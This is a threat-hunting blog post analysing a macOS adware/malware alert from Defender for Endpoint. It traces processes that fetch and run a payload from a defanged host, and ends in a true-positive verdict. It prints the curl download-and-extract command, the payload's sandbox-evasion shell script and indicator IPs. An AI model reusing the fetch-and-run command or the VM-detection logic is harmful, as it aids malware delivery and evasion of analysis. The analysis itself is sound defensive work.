---
title: Mac Malware?
date: 2022-05-19 11:39 +0200
categories: [Hunting, MDE]
tags: [mde, hunting, true positive]
---

Today we investigate some strange discovery actions by processes on a macbook

## The Alert

In the essence this alert was showing multiple different processes doing very similar actions, for the sake of simplicity we will focus on one.
In most cases the process [xpcproxy](https://www.unix.com/man-page/osx/8/xpcproxy/) was used to run a sub process which in turn started some bash commands.
For this investigation I put xpcproxy out of scope as it did not seem to be part of a malicious execution chain as it is part of the OS (my mac knowledge is basic)
This xpcproxy would run an executable for example apadecoded and this in turn would run new processes, for example:

```bash
/bin/sh /var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/451CEB63-C438-40C3-899F-0BE4F425F074
```

apadecoded itself looks already strange enough and is also found on VT, but what is this "451CEB63-C438-40C3-899F-0BE4F425F074"?
here again, for simplicity I focus on one of these odd looking processes, there are a bucket load of them.

This executable runs a download via curl of some additional code from [external](https://www.virustotal.com/gui/url/602823beeb1e3e8c4b09c1c4defeb5c6381620e6a6b9be9c3120df12c21c0f0e) and extracts it to "/private/var/tmp/helpexecd/helpexecd"

```bash
/usr/bin/curl -s -L -o /var/tmp/helpexecd.tgz hxxp://cdn[.]eniqdix[.]icu/static/s3/exec6625/helpexecd[.]tgz
tar -xzf /var/tmp/helpexecd.tgz -C /var/tmp/helpexecd/
```

After that the archive helpexecd.tgz is extracted to /var/tmp/helpexecd/ and executed.
This new process helpexecd then runs the following command (amongst other things)
```bash
/bin/sh -c 'readonly VM_LIST="VirtualBox\|Oracle\|VMware\|Parallels\|qemu";is_hwmodel_vm(){ ! sysctl -n hw.model|grep "Mac">/dev/null;};is_ram_vm(){(($(($(sysctl -n hw.memsize)/ 1073741824))<4));};is_ped_vm(){ local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo "${ped}"|grep -e "board-id" -e "product-name" -e "model"|grep -qi "${VM_LIST}"||echo "${ped}"|grep "manufacturer"|grep -v "Apple">/dev/null;};is_vendor_name_vm(){ ioreg -l|grep -e "Manufacturer" -e "Vendor Name"|grep -qi "${VM_LIST}";};is_hw_data_vm(){ system_profiler SPHardwareDataType 2>&1 /dev/null|grep -e "Model Identifier"|grep -qi "${VM_LIST}";};is_vm(){ is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){ is_vm&&echo 1||echo 0;};main "${@}"'
```

On closer inspection and a bit of unwrapping, it looks a lot like this helpexecd is trying to figure out if it's running in a sandbox.
It checks for what hardware it's running on, good indication of sandbox evasion.

```bash
/bin/sh -c 'readonly VM_LIST="VirtualBox\|Oracle\|VMware\|Parallels\|qemu";is_hwmodel_vm(){
 ! sysctl -n hw.model|grep "Mac">/dev/null;};is_ram_vm(){
    (($(($(sysctl -n hw.memsize)/ 1073741824))<4));};is_ped_vm(){
 local -r ped=$(ioreg -rd1 -c IOPlatformExpertDevice);echo "${
    ped}"|grep -e "board-id" -e "product-name" -e "model"|grep -qi "${
    VM_LIST}"||echo "${
    ped}"|grep "manufacturer"|grep -v "Apple">/dev/null;};is_vendor_name_vm(){
 ioreg -l|grep -e "Manufacturer" -e "Vendor Name"|grep -qi "${
    VM_LIST}";};is_hw_data_vm(){
 system_profiler SPHardwareDataType 2>&1 /dev/null|grep -e "Model Identifier"|grep -qi "${
    VM_LIST}";};is_vm(){
 is_hwmodel_vm||is_ram_vm||is_ped_vm||is_vendor_name_vm||is_hw_data_vm;};main(){
 is_vm&&echo 1||echo 0;};main "${
    @}"'
```

## Flowchart
{% include mermaid_start.liquid %}
flowchart TD;
kernel_task --> launchd;
launchd --> xpcproxy;
xpcproxy --> |run| apadecoded;
apadecoded --> 451CEB63-C438-40C3-899F-0BE4F425F074;
apadecoded --> |run| DFBDC5FD-3F69-472A-832B-C8C394560BC4;
apadecoded --> AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09;
451CEB63-C438-40C3-899F-0BE4F425F074 --> curl;
DFBDC5FD-3F69-472A-832B-C8C394560BC4 --> |run| curl;
AF0DBE7E-0247-4D2C-8D8D-36BDB5C5EF09 --> curl;
curl --> cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz;
cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --> |download| 89.187.162.142;
cdn.eniqdix.icu/static/s3/exec6625/helpexecd.tgz --> |download| 89.187.162.134;
89.187.162.142 --> |download| /private/var/tmp/helpexecd/helpexecd.tgz;
89.187.162.134 --> |download| /private/var/tmp/helpexecd/helpexecd.tgz;
/private/var/tmp/helpexecd/helpexecd.tgz --> |extract && run| helpexecd;
helpexecd --> 35.160.226.50;
helpexecd --> 34.217.226.241;
style apadecoded stroke-dasharray: 88.5 44
style helpexecd stroke-dasharray: 88.5 44
{% include mermaid_end.liquid %}

## Hunting deeper

We have so far focused on one process, but here is a list of a lot more of them.
All of them do the exact same things, which really makes me think that his could be real malware, how exciting.

* canonistical
* noble
* odontolite
* intrinsicalness
* TestDate
* SysUpdater
* leam
* recommitment
* TestDateDaemon
* apadecode
* apadecoded

I now turned to Virustotal to see what they have to say about this.
Once again with focus on one process [apadecoded](https://www.virustotal.com/gui/file/ec791335020a61a36263de7671ab9741d9212cc4692c85abca81862e0daaf82c)
on VT I get a lot of Adware chatter, which in my opinion of course could be true. But some also classify this as outright malware.
It is always difficult to know when to stop an investigation, I would love to analyse this more in a sandbox, but since we usually only have Windows Sandboxes, and I have no patience to build a mac one, let's stop this here.
I think we have enough indicators anyway

## Verdict

| Indicator                                                                   | Thoughts                                                           | Verdict |
|-----------------------------------------------------------------------------|--------------------------------------------------------------------|---------|
| Process starts strangely named Processes                                    | Maybe a kind of obfuscation?                                       | +20%    |
| "Obfuscated" process downloads additional code                              | Very likely bad behaviour                                          | +20%    |
| Newly downloaded code is checks hardware it is running on (sandbox evasion) | Sandbox evasion is often a bad sign                                | +20%    |
| Many processes doing exactly the same                                       | Once again, this looks like something done to confuse the defender | +20%    |
| Virustotal results in Adware or Malware                                     | Honestly, it could be Adware, but I will treat as Malware          | +20%    |

**Verdict: True Positive**

## Next Steps
Reinstall that machine, no patience for cleaning such a mess
